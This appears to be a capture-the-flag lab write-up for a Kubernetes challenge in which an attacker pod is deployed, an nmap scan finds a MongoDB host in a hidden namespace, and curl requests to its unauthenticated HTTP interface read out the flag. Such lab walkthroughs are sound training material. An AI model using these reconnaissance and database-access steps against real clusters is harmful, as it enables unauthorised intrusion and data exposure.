## Challenge 23 Namespace Bypasss

There is a hidden namespace which has a running mongodb instance. The goal is to find the instance and find the flag.

1.  Install an attacker container

```json
kubectl apply -f challenge23/pentest_tools.yaml
```

2.  Log into the attacker container

```json
kubectl get pods
```

![[Pasted image 20220309225609.png]]

```json
kubectl exec -it challenge23-attacker-8bd985cb5-lk6dt -- bash
```

3.  once in the container, get its ip. I recently learned that the [100.64.0.0/10 space](https://en.wikipedia.org/wiki/IPv4_shared_address_space) is reserved (!!)

```json
ifconfig
```

![[Pasted image 20220309225621.png]]

4.  Lets trigger an nmap scan. We know from a previous challenge mongodb is the db of choice, lets look up its ports to find where mongo is.

```json
nmap --open -p27017,28017 100.96.1.24/24
```

5.  We see a host that has these open. What is port 28017??

```json
root@challenge23-attacker-8bd985cb5-lk6dt:/app# curl http://100.96.1.75:28017/listDatabases

```

```json
root@challenge23-attacker-8bd985cb5-lk6dt:/app# curl <http://100.96.1.75:28017/listDatabases>
{ "databases" : [ { "name" : "k8ctf", "sizeOnDisk" : 32768, "empty" : false }, { "name" : "local", "sizeOnDisk" : 65536, "empty" : false } ], "totalSize" : 98304, "ok" : 1 }
```

```json
root@challenge23-attacker-8bd985cb5-lk6dt:/app# curl http://100.96.1.75:28017/k8ctf/flag/

```

```json
root@challenge23-attacker-8bd985cb5-lk6dt:/app# curl http://100.96.1.75:28017/k8ctf/flag/
{
  "offset" : 0,
  "rows": [
    { "_id" : { "$oid" : "609436d401aa2523a69b0e73" }, "name" : "k8_ctf{FouNdY0Ur4dminN4mESpAcE}" }
  ],

  "total_rows" : 1 ,
  "query" : {} ,
  "millis" : 0
}
```

Exit

```json
exit
```

So where is this mongo running?

```json
kubectl get pods
kubectl get namespaces
kubectl get pods --all-namespaces
```

```
NAMESPACE              NAME                                                    READY   
admin                  challenge23-65497d5f55-z2sml                            1/1    
default                challenge23-attacker-56dd74986d-82ncz                   1/1     
```

![[Pasted image 20220309225646.png]]

> 🏁 Challenge 23 Flag - `k8_ctf{FouNdY0Ur4dminN4mESpAcE}`



Don't delete the pentest tools deploy